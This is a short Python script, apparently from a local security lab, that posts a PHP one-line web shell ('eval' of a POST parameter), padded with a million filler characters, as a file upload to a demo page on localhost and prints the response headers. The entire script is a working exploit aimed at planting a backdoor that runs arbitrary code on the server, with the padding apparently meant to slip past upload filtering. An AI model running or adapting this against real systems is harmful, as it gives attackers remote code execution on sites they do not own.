from requests import post

files = {
    'file': r'<?php eval($_POST[123]);//' + r'a' * 1000000
}

url = 'http://127.0.0.1/xss_location/demo6.php'

res = post(url, files=files, allow_redirects=False)

print(res.headers)